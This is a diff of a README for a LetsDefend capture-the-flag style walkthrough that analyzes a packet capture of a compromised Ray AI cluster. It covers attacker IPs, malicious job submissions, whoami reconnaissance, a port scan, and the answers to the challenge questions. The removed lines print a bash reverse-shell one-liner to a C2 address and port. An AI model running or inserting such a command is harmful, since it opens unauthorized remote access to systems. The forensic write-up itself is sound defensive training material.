@@ -1,9 +1,9 @@
 
-# 🧠💥 LetsDefend Walkthrough – Compromised AI Cluster Challenge
+# LetsDefend Walkthrough – Compromised AI Cluster
 
-Welcome to this **step-by-step walkthrough** of the _Compromised AI Cluster_ challenge on [LetsDefend](https://letsdefend.io)! 🛡️ In this scenario, we’re diving into an incident involving an AI infrastructure running **Ray**—an open-source distributed computing framework for AI/ML workloads.
+Welcome to this **question-by-question walkthrough** of the _Compromised AI Cluster_ challenge created by [LetsDefend](https://letsdefend.io)🛡️ In this scenario, we’re diving into an incident involving an AI infrastructure running **Ray**—an open-source distributed computing framework for AI/ML workloads.
 
-> 🎯 **Objective:** Analyze a PCAP file, identify attacker behavior, and extract indicators of compromise (IOCs).
+> 🎯 **Objective:** Analyze a PCAP file, identify attacker behavior and extract indicators of compromise (IOCs)
 
 ---
 
@@ -43,7 +43,7 @@ Searched for the string "Version"
 ![Q2](https://github.com/user-attachments/assets/7392ab81-73d3-4fb7-a185-96c342cddac4)
 
 
-`Found version number in an HTTP response payload.`
+Found version number in an HTTP response payload.
 
 
 
@@ -58,9 +58,6 @@ Searched for the string "Version"
 In HTTP request headers, the `Host:` field revealed the external IP and port where the Ray dashboard was publicly accessible.
 
 ![Q3](https://github.com/user-attachments/assets/16b01e34-4ee4-445e-bcde-8ea2dfbb8338)
-
-
-
 
 ---
 
@@ -94,7 +91,7 @@ Additionally, I noticed the use of a `/usr/bin/pwd` command in conjunction with 
 
 ![Q5](https://github.com/user-attachments/assets/a8b9f996-71bb-4a51-a1f8-ffb634613c38)
 
-At this point in the investigation, I had noticed that three IP addresses shared the same first two octets `(104.28.x.x)`, suggesting they might be related or part of the same infrastructure. To explore this lead, I filtered the logs for activity from these three IPs. **This helped me identify the earliest interaction — an ICMP packet from 104.28.154.194 — which occurred on 2024-04-12 15:51:41 UTC.** Although this IP was different from the one I previously confirmed as persistently malicious, the shared prefix indicated a likely connection between them and helped trace the attacker’s initial footprint.
+At this point in the investigation, I had noticed that three IP addresses shared the same first two octets `(104.28.x.x)`, suggesting they might be related or part of the same infrastructure. To explore this lead, I filtered the logs for activity from these three IPs. `This helped me identify the earliest interaction — an ICMP packet from 104.28.154.194 — which occurred on 2024-04-12 15:51:41 UTC.` Although this IP was different from the one I previously confirmed as persistently malicious, the shared prefix indicated a likely connection between them and helped trace the attacker’s initial footprint.
 
 ---
 
@@ -112,7 +109,7 @@ http.request.method == "POST" && http contains "/api/jobs"
 
 ![Q6](https://github.com/user-attachments/assets/680f9832-3834-458c-b08f-89b8f3deb821)
 
-`The first observed job submission resulting from attacker activity was associated with the submission ID raysubmit_kkeJ8vLuM942ycqH. This was triggered by a POST request from the attacker IP 104.28.213.2, marking the point at which the adversary began interacting more directly with the system’s job handling functionality.`
+The first observed job submission resulting from attacker activity was associated with the submission ID `raysubmit_kkeJ8vLuM942ycqH`. This was triggered by a POST request from the attacker IP `104.28.213.2`, marking the point at which the adversary began interacting more directly with the system’s job handling functionality.
 
 **Discussion on the preceding POST request in question 8!**
 
@@ -137,22 +134,24 @@ During the process of reviewing all of the traffic from attacker IP 104.28.213.2
 
 ✅ **Answer:** `whoami`
 
-![Q8](https://github.com/user-attachments/assets/3e7e8599-222d-4648-870b-11a8f49b2bac)
+![Q8](https://github.com/user-attachments/assets/a9c0a38a-b1e5-488f-813b-72f9c59a74ed)
 
+The attacker sent a POST request to the /api/jobs endpoint containing a whoami command. This command was likely used for reconnaissance to determine the username and privilege level of the account executing the remote code on the compromised system.
 
 ---
 
 ## 🛰️ 9. Reverse Shell Target
 
-**📝 Question:** Where was the reverse shell initiated?
-
-Detected outbound TCP connection in a job:
-
-```bash
-bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
-```
+**📝 Question:** Where was the reverse shell initiated? What IP address and port were used?
 
 ✅ **Answer:** `52.150.25.174:1337`
+
+![Q9](https://github.com/user-attachments/assets/8de0e4a0-3caa-4b24-ab10-ccb279577b28)
+
+Following the whoami request, the image above shows a POST request sent to the server containing a reverse shell payload that initiates a reverse shell back to the C2 `52.150.25.174:1337`. Following the server's completion of this job, we see several packets of data between the server and the C2 that indicate that the reverse shell was successfully established.
+
+![Q9-2](https://github.com/user-attachments/assets/37b3bfff-7d46-472c-b2ac-8cedf9994c4f)
+
 
 ---
 
@@ -160,10 +159,15 @@ bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
 
 **📝 Question:** From what directory was the reverse shell executed?
 
-📂 Directory seen in job environment:
-
 ✅ **Answer:**  
 `/tmp/ray/session_2024-04-12_11-13-55_403523_10331/runtime_resources/working_dir_files/_ray_pkg_bf19252c1fb036e5`
+
+![image](https://github.com/user-attachments/assets/9bd18c24-762e-437f-8112-4b6ce51521a2)
+
+By following the TCP stream between the AI cluster and malicious C2 server, I could see full directory that the reverse shell was executed from. Additionally, we can see that the attacker has root access, the highest level of privileges on the system. In the following image, we can see the attacker exploring the filesystem, successfully listing the contents of the `/home` directory using `ls /home`, and discovering a file named `secret.txt`. 
+
+![image](https://github.com/user-attachments/assets/07f7b987-b4fe-44ca-973b-ea35243973df)
+
 
 ---
 
@@ -173,6 +177,10 @@ bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
 
 ✅ **Answer:** `raysubmit_7WZE36LAkVxbNc1x`
 
+![Q14-3](https://github.com/user-attachments/assets/37a262d0-26c9-4343-9d0a-9c59dc7713aa)
+
+Following the discovery of the `secret.txt` file, the attackers submitted a job to the server to obtain the contents of this file, receiving the job ID `raysubmit_7WZE36LAkVxbNc1x`. Following the job completion, the attackers receive the job logs containing the file contents which say `"Ops, you got me."(Answer to question 13)`
+
 ---
 
 ## 🔀 12. New IP Used in Later Stages
@@ -181,13 +189,13 @@ bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
 
 ✅ **Answer:** `104.28.213.2`
 
+Referring back to the image on question 11, while the previous exploits were launched from a different IP, the request to fetch the job logs containing the `secret.txt` contents originated from a new attacker IP address: `104.28.213.2`.
+
 ---
 
 ## 📜 13. Contents of Exfiltrated File
 
 **📝 Question:** What was in the exfiltrated file?
-
-📄 `secret.txt` contents:
 
 ✅ **Answer:** `"Ops, you got me."`
 
@@ -195,7 +203,7 @@ bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
 
 ## 🔓 14. Brute Force Behavior
 
-**📝 Question:** How many brute-force packets were sent?
+**📝 Question:** The attacker deployed a tool to brute-force open ports on your network. How many packets were generated by this brute-force attempt?
 
 Used Wireshark filter:
 
@@ -210,6 +218,10 @@ Statistics > Endpoints > IPv4
 ```
 
 ✅ **Answer:** `39,598 SYN packets`
+
+![Q14](https://github.com/user-attachments/assets/509a8223-68b5-4a69-bac7-19c2e10585f7)
+
+Throughout the investigation I noticed a high number of SYN packets from `104.28.154.194`. Using the filters above I was able to pull the statistics and get the total number.
 
 ---
 
